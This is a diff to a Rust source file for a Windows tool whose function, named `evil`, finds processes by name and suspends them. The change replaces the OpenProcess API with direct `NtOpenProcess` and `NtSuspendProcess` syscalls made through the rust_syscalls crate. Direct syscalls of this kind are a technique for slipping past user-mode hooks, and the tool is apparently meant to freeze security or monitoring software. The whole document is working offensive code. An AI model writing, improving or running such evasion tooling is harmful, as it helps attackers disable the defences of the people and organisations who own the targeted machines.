@@ -1,15 +1,13 @@
 use colored::Colorize;
+use ntapi::ntapi_base::CLIENT_ID;
 use rust_syscalls::syscall;
 use std::env;
-use std::ffi::c_void;
-use std::mem::transmute;
+use std::mem::size_of;
 use sysinfo::PidExt;
 use sysinfo::ProcessExt;
 use sysinfo::SystemExt;
-use windows::Win32::{
-    Foundation::HANDLE,
-    System::Threading::{OpenProcess, PROCESS_SUSPEND_RESUME},
-};
+use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
+use winapi::um::winnt::PROCESS_SUSPEND_RESUME;
 
 fn evil(target: &str) {
     let system = sysinfo::System::new_all();
@@ -17,21 +15,41 @@ fn evil(target: &str) {
     for p in system.processes_by_exact_name(target) {
         println!("Targeting process: {} with PID: {}", p.name(), p.pid());
         let pid: u32 = p.pid().as_u32();
+
+        let cid: CLIENT_ID = CLIENT_ID {
+            UniqueProcess: pid as _,
+            UniqueThread: 0 as _,
+        };
+
+        let oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
+            Length: size_of::<OBJECT_ATTRIBUTES>() as _,
+            RootDirectory: NULL,
+            ObjectName: NULL as _,
+            Attributes: 0,
+            SecurityDescriptor: NULL,
+            SecurityQualityOfService: NULL,
+        };
+
+        let mut handle: HANDLE = NULL;
+        let mut ntstatus: NTSTATUS;
+
         unsafe {
-            let res_handle = OpenProcess(
+            ntstatus = syscall!(
+                "NtOpenProcess",
+                &mut handle,
                 PROCESS_SUSPEND_RESUME,
-                windows::Win32::Foundation::BOOL::from(false),
-                pid,
+                &oa,
+                &cid
             );
 
-            let handle: HANDLE = match res_handle {
-                Ok(h) => h,
-                Err(e) => {
+            match ntstatus {
+                0 => {}
+                _ => {
                     let message = format!(
-                        "[-] Error accessing process: {} with PID: {}. Error: {}. Skipping..",
+                        "[-] Error accessing process: {} with PID: {}. NTSTATUS: {}. Skipping..",
                         p.name(),
                         p.pid(),
-                        e
+                        ntstatus
                     )
                     .red();
                     println!("{}", message);
@@ -39,9 +57,7 @@ fn evil(target: &str) {
                 }
             };
 
-            let c_handle: *mut c_void = transmute(handle);
-
-            let ntstatus = syscall!("NtSuspendProcess", c_handle);
+            ntstatus = syscall!("NtSuspendProcess", handle);
 
             match ntstatus {
                 0 => {
